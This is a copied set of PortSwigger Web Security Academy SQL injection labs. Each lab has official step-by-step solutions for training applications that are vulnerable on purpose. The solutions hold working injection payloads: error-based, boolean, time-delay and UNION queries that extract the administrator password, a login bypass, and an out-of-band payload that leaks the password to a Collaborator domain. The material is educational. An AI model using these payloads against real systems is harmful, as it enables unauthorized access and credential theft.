# PortSwigger labs: sql injection

> Copied from <https://portswigger.net/web-security/sql-injection>. Questions and answers are the source's own; nothing was answered or rewritten here.


## 1. Blind SQL injection with conditional errors

[Open the lab](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

<details><summary>Hint</summary>

This lab uses an Oracle database. For more information, see the [SQL injection cheat sheet](/web-security/sql-injection/cheat-sheet).

</details>

<details><summary>Official solution</summary>

1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie. For simplicity, let's say the original value of the cookie is `TrackingId=xyz`.
2. Modify the `TrackingId` cookie, appending a single quotation mark to it:

   `TrackingId=xyz'`

   Verify that an error message is received.
3. Now change it to two quotation marks:
   `TrackingId=xyz''`
   Verify that the error disappears. This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response.
4. You now need to confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting:

   `TrackingId=xyz'||(SELECT '')||'`

   In this case, notice that the query still appears to be invalid. This may be due to the database type - try specifying a predictable table name in the query:

   `TrackingId=xyz'||(SELECT '' FROM dual)||'`

   As you no longer receive an error, this indicates that the target is probably using an Oracle database, which requires all `SELECT` statements to explicitly specify a table name.
5. Now that you've crafted what appears to be a valid query, try submitting an invalid query while still preserving valid SQL syntax. For example, try querying a non-existent table name:

   `TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'`

   This time, an error is returned. This behavior strongly suggests that your injection is being processed as a SQL query by the back-end.
6. As long as you make sure to always inject syntactically valid SQL queries, you can use this error response to infer key information about the database. For example, in order to verify that the `users` table exists, send the following query:

   `TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`

   As this query does not return an error, you can infer that this table does exist. Note that the `WHERE ROWNUM = 1` condition is important here to prevent the query from returning more than one row, which would break our concatenation.
7. You can also exploit this behavior to test conditions. First, submit the following query:

   `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`

   Verify that an error message is received.
8. Now change it to:

   `TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`

   Verify that the error disappears. This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The `CASE` statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions `1=1` and `1=2`, and an error is received when the condition is `true`.
9. You can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username `administrator` exists:

   `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

   Verify that the condition is true (the error is received), confirming that there is a user called `administrator`.
10. The next step is to determine how many characters are in the password of the `administrator` user. To do this, change the value to:

    `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

    This condition should be true, confirming that the password is greater than 1 character in length.
11. Send a series of follow-up values to test different password lengths. Send:

    `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

    Then send:

    `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

    And so on. You can do this manually using [Burp Repeater](/burp/documentation/desktop/tools/repeater), since the length is likely to be short. When the condition stops being true (i.e. when the error disappears), you have determined the length of the password, which is in fact 20 characters long.
12. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use [Burp Intruder](/burp/documentation/desktop/tools/intruder). Send the request you are working on to Burp Intruder, using the context menu.
13. Go to Burp Intruder and change the value of the cookie to:

    `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

    This uses the `SUBSTR()` function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
14. Place payload position markers around the final `a` character in the cookie value. To do this, select just the `a`, and click the
    "Add §" button. You should then see the following as the cookie value (note the payload position markers):

    `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
15. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. In the "Payloads" side panel, check that "Simple list" is selected, and under "Payload configuration" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.
16. Launch the attack by clicking the " Start attack" button.
17. Review the attack results to find the value of the character at the first position. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally. The "Status" column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position.
18. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the original Intruder tab, and change the specified offset from 1 to 2. You should then see the following as the cookie value:

    `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
19. Launch the modified attack, review the results, and note the character at the second offset.
20. Continue this process testing offset 3, 4, and so on, until you have the whole password.
21. In the browser, click "My account" to open the login page. Use the password to log in as the `administrator` user.

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=HjXUtCKm1FM

##### Rana Khalil

https://www.youtube.com/watch?v=_7w-KEP_K5w

##### Michael Sommer

https://www.youtube.com/watch?v=HbaD3maRucc

</details>


## 2. Blind SQL injection with conditional responses

[Open the lab](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a
`Welcome back` message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

<details><summary>Hint</summary>

You can assume that the password only contains lowercase, alphanumeric characters.

</details>

<details><summary>Official solution</summary>

1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie. For simplicity, let's say the original value of the cookie is `TrackingId=xyz`.
2. Modify the `TrackingId` cookie, changing it to:

   `TrackingId=xyz' AND '1'='1`

   Verify that the `Welcome back` message appears in the response.
3. Now change it to:

   `TrackingId=xyz' AND '1'='2`

   Verify that the `Welcome back` message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.
4. Now change it to:

   `TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`

   Verify that the condition is true, confirming that there is a table called `users`.
5. Now change it to:

   `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`

   Verify that the condition is true, confirming that there is a user called `administrator`.
6. The next step is to determine how many characters are in the password of the `administrator` user. To do this, change the value to:

   `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`

   This condition should be true, confirming that the password is greater than 1 character in length.
7. Send a series of follow-up values to test different password lengths. Send:

   `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a`

   Then send:

   `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a`

   And so on. You can do this manually using [Burp Repeater](/burp/documentation/desktop/tools/repeater), since the length is likely to be short. When the condition stops being true (i.e. when the
   `Welcome back` message disappears), you have determined the length of the password, which is in fact 20 characters long.
8. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use [Burp Intruder](/burp/documentation/desktop/tools/intruder). Send the request you are working on to Burp Intruder, using the context menu.
9. In Burp Intruder, change the value of the cookie to:

   `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`

   This uses the `SUBSTRING()` function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
10. Place payload position markers around the final `a` character in the cookie value. To do this, select just the `a`, and click the **Add §** button. You should then see the following as the cookie value (note the payload position markers):

    `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`
11. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. In the
    **Payloads** side panel, check that **Simple list** is selected, and under
    **Payload configuration** add the payloads in the range a - z and 0 - 9. You can select these easily using the **Add from list** drop-down.
12. To be able to tell when the correct character was submitted, you'll need to grep each response for the expression
    `Welcome back`. To do this, click on the
     **Settings** tab to open the **Settings** side panel. In the **Grep - Match** section, clear existing entries in the list, then add the value `Welcome back`.
13. Launch the attack by clicking the  **Start attack** button.
14. Review the attack results to find the value of the character at the first position. You should see a column in the results called `Welcome back`. One of the rows should have a tick in this column. The payload showing for that row is the value of the character at the first position.
15. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the **Intruder** tab, and change the specified offset from 1 to 2. You should then see the following as the cookie value:

    `TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a`
16. Launch the modified attack, review the results, and note the character at the second offset.
17. Continue this process testing offset 3, 4, and so on, until you have the whole password.
18. In the browser, click **My account** to open the login page. Use the password to log in as the `administrator` user.

#### Note

For more advanced users, the solution described here could be made more elegant in various ways. For example, instead of iterating over every character, you could perform a binary search of the character space. Or you could create a single Intruder attack with two payload positions and the cluster bomb attack type, and work through all permutations of offsets and character values.

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=LBG_n9fr8sM

##### z3nsh3ll

https://www.youtube.com/watch?v=W3zvXK9i75A

</details>


## 3. Blind SQL injection with out-of-band data exfiltration

[Open the lab](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

<details><summary>Hint</summary>

You can find some useful payloads on our [SQL injection cheat sheet](/web-security/sql-injection/cheat-sheet).

</details>

<details><summary>Official solution</summary>

1. Visit the front page of the shop, and use Burp Suite Professional to intercept and modify the request containing the `TrackingId` cookie.
2. Modify the `TrackingId` cookie, changing it to a payload that will leak the administrator's password in an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:

   `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
3. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified `TrackingId` cookie.
4. Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side query is executed asynchronously.
5. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The password of the `administrator` user should appear in the subdomain of the interaction, and you can view this within the Collaborator tab. For DNS interactions, the full domain name that was looked up is shown in the Description tab. For HTTP interactions, the full domain name is shown in the Host header in the Request to Collaborator tab.
6. In the browser, click "My account" to open the login page. Use the password to log in as the `administrator` user.

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=KOaDan0UqFs

##### Michael Sommer

https://www.youtube.com/watch?v=-ReGzKgrOd4

</details>


## 4. Blind SQL injection with out-of-band interaction

[Open the lab](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

<details><summary>Hint</summary>

You can find some useful payloads on our [SQL injection cheat sheet](/web-security/sql-injection/cheat-sheet).

</details>

<details><summary>Official solution</summary>

1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie.
2. Modify the `TrackingId` cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:

   `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
3. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified `TrackingId` cookie.

The solution described here is sufficient simply to trigger a DNS lookup and so solve the lab. In a real-world situation, you would use [Burp Collaborator](/burp/documentation/desktop/tools/collaborator) to verify that your payload had indeed triggered a DNS lookup and potentially exploit this behavior to exfiltrate sensitive data from the application. We'll go over this technique in the next lab.

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=-t4cr5uRzzA

##### Michael Sommer

https://www.youtube.com/watch?v=dP4fGg11whc

</details>


## 5. Visible error-based SQL injection

[Open the lab](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)

This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

The database contains a different table called `users`, with columns called `username` and `password`. To solve the lab, find a way to leak the password for the `administrator` user, then log in to their account.

<details><summary>Official solution</summary>

1. Using Burp's built-in browser, explore the lab functionality.
2. Go to the **Proxy > HTTP history** tab and find a `GET /` request that contains a `TrackingId` cookie.
3. In Repeater, append a single quote to the value of your `TrackingId` cookie and send the request.

   `TrackingId=ogAZZfxtOKUELbuJ'`
4. In the response, notice the verbose error message. This discloses the full SQL query, including the value of your cookie. It also explains that you have an unclosed string literal. Observe that your injection appears inside a single-quoted string.
5. In the request, add comment characters to comment out the rest of the query, including the extra single-quote character that's causing the error:

   `TrackingId=ogAZZfxtOKUELbuJ'--`
6. Send the request. Confirm that you no longer receive an error. This suggests that the query is now syntactically valid.
7. Adapt the query to include a generic `SELECT` subquery and cast the returned value to an `int` data type:

   `TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--`
8. Send the request. Observe that you now get a different error saying that an `AND` condition must be a boolean expression.
9. Modify the condition accordingly. For example, you can simply add a comparison operator (`=`) as follows:

   `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--`
10. Send the request. Confirm that you no longer receive an error. This suggests that this is a valid query again.
11. Adapt your generic `SELECT` statement so that it retrieves usernames from the database:

    `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--`
12. Observe that you receive the initial error message again. Notice that your query now appears to be truncated due to a character limit. As a result, the comment characters you added to fix up the query aren't included.
13. Delete the original value of the `TrackingId` cookie to free up some additional characters. Resend the request.

    `TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--`
14. Notice that you receive a new error message, which appears to be generated by the database. This suggests that the query was run properly, but you're still getting an error because it unexpectedly returned more than one row.
15. Modify the query to return only one row:

    `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
16. Send the request. Observe that the error message now leaks the first username from the `users` table:

    `ERROR: invalid input syntax for type integer: "administrator"`
17. Now that you know that the `administrator` is the first user in the table, modify the query once again to leak their password:

    `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
18. Log in as `administrator` using the stolen password to solve the lab.

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=sAZV4z9rOVE

</details>


## 6. Blind SQL injection with time delays and information retrieval

[Open the lab](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

<details><summary>Hint</summary>

You can find some useful payloads on our [SQL injection cheat sheet](/web-security/sql-injection/cheat-sheet).

</details>

<details><summary>Official solution</summary>

1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie.
2. Modify the `TrackingId` cookie, changing it to:

   `TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`

   Verify that the application takes 10 seconds to respond.
3. Now change it to:

   `TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`

   Verify that the application responds immediately with no time delay. This demonstrates how you can test a single boolean condition and infer the result.
4. Now change it to:

   `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

   Verify that the condition is true, confirming that there is a user called `administrator`.
5. The next step is to determine how many characters are in the password of the `administrator` user. To do this, change the value to:

   `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

   This condition should be true, confirming that the password is greater than 1 character in length.
6. Send a series of follow-up values to test different password lengths. Send:

   `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

   Then send:

   `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

   And so on. You can do this manually using [Burp Repeater](/burp/documentation/desktop/tools/repeater), since the length is likely to be short. When the condition stops being true (i.e. when the application responds immediately without a time delay), you have determined the length of the password, which is in fact 20 characters long.
7. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use [Burp Intruder](/burp/documentation/desktop/tools/intruder). Send the request you are working on to Burp Intruder, using the context menu.
8. In Burp Intruder, change the value of the cookie to:

   `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

   This uses the `SUBSTRING()` function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
9. Place payload position markers around the `a` character in the cookie value. To do this, select just the `a`, and click the **Add §** button. You should then see the following as the cookie value (note the payload position markers):

   `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
10. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lower case alphanumeric characters. In the
    **Payloads** side panel, check that **Simple list** is selected, and under
    **Payload configuration** add the payloads in the range a - z and 0 - 9. You can select these easily using the **Add from list** drop-down.
11. To be able to tell when the correct character was submitted, you'll need to monitor the time taken for the application to respond to each request. For this process to be as reliable as possible, you need to configure the Intruder attack to issue requests in a single thread. To do this, click the  **Resource pool** tab to open the **Resource pool** side panel and add the attack to a resource pool with the
    **Maximum concurrent requests** set to `1`.
12. Launch the attack by clicking the  **Start attack** button.
13. Review the attack results to find the value of the character at the first position. You should see a column in the results called **Response received**. This will generally contain a small number, representing the number of milliseconds the application took to respond. One of the rows should have a larger number in this column, in the region of 10,000 milliseconds. The payload showing for that row is the value of the character at the first position.
14. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window and change the specified offset from 1 to 2. You should then see the following as the cookie value:

    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
15. Launch the modified attack, review the results, and note the character at the second offset.
16. Continue this process testing offset 3, 4, and so on, until you have the whole password.
17. In the browser, click **My account** to open the login page. Use the password to log in as the `administrator` user.

</details>

<details><summary>Community solutions</summary>

##### Intigriti

https://www.youtube.com/watch?v=xHzH00vyVHA

##### Rana Khalil

https://www.youtube.com/watch?v=L2e6wrNj4BA

##### Michael Sommer

https://www.youtube.com/watch?v=ogljCf4oR3E

</details>


## 7. Blind SQL injection with time delays

[Open the lab](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.

<details><summary>Hint</summary>

You can find some useful payloads on our [SQL injection cheat sheet](/web-security/sql-injection/cheat-sheet).

</details>

<details><summary>Official solution</summary>

1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie.
2. Modify the `TrackingId` cookie, changing it to:

   `TrackingId=x'||pg_sleep(10)--`
3. Submit the request and observe that the application takes 10 seconds to respond.

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=9l49BmQQVsw

##### Michael Sommer

https://www.youtube.com/watch?v=WLsnWUGP6Tw

</details>


## 8. SQL injection attack, listing the database contents on non-Oracle databases

[Open the lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

<details><summary>Hint</summary>

You can find some useful payloads on our [SQL injection cheat sheet](/web-security/sql-injection/cheat-sheet).

</details>

<details><summary>Official solution</summary>

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the [number of columns that are being returned by the query](/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:

   `'+UNION+SELECT+'abc','def'--`
3. Use the following payload to retrieve the list of tables in the database:

   `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:

   `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:

   `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`
8. Find the password for the `administrator` user, and use it to log in.

</details>

<details><summary>Community solutions</summary>

##### Intigriti

https://www.youtube.com/watch?v=cC0_pFyvFtA

##### Rana Khalil

https://www.youtube.com/watch?v=JduM_dO8glw

##### Michael Sommer

https://www.youtube.com/watch?v=Kd810Iiv1dM

</details>


## 9. SQL injection attack, listing the database contents on Oracle

[Open the lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

<details><summary>Hint</summary>

On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.

There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`

For more information, see our [SQL injection cheat sheet](/web-security/sql-injection/cheat-sheet).

</details>

<details><summary>Official solution</summary>

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the [number of columns that are being returned by the query](/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:

   `'+UNION+SELECT+'abc','def'+FROM+dual--`
3. Use the following payload to retrieve the list of tables in the database:

   `'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:

   `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--`
6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:

   `'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--`
8. Find the password for the `administrator` user, and use it to log in.

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=ZbwIbIq5-eE

</details>


## 10. SQL injection attack, querying the database type and version on MySQL and Microsoft

[Open the lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

<details><summary>Hint</summary>

You can find some useful payloads on our [SQL injection cheat sheet](/web-security/sql-injection/cheat-sheet).

</details>

<details><summary>Official solution</summary>

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the [number of columns that are being returned by the query](/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:

   `'+UNION+SELECT+'abc','def'#`
3. Use the following payload to display the database version:

   `'+UNION+SELECT+@@version,+NULL#`

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=4UxUpsCZQfI

##### Rana Khalil

https://www.youtube.com/watch?v=MFTk_LNRW0g

##### Michael Sommer

https://www.youtube.com/watch?v=7afmKPDaZtw

</details>


## 11. SQL injection attack, querying the database type and version on Oracle

[Open the lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

<details><summary>Hint</summary>

On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.

There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`

For more information, see our [SQL injection cheat sheet](/web-security/sql-injection/cheat-sheet).

</details>

<details><summary>Official solution</summary>

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the [number of columns that are being returned by the query](/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:

   `'+UNION+SELECT+'abc','def'+FROM+dual--`
3. Use the following payload to display the database version:

   `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=s4CxZ0txb6g

##### Rana Khalil

https://www.youtube.com/watch?v=s0dFU2dKAKU

##### Michael Sommer

https://www.youtube.com/watch?v=4sg7ur5Yptk

</details>


## 12. SQL injection vulnerability allowing login bypass

[Open the lab](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.

<details><summary>Official solution</summary>

1. Use Burp Suite to intercept and modify the login request.
2. Modify the `username` parameter, giving it the value: `administrator'--`

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=ML3aGaloczI

##### z3nsh3ll

https://www.youtube.com/watch?v=mS0A9e_oy8A

##### Michael Sommer

https://www.youtube.com/watch?v=4FGkpyYYfCs

</details>


## 13. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

[Open the lab](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

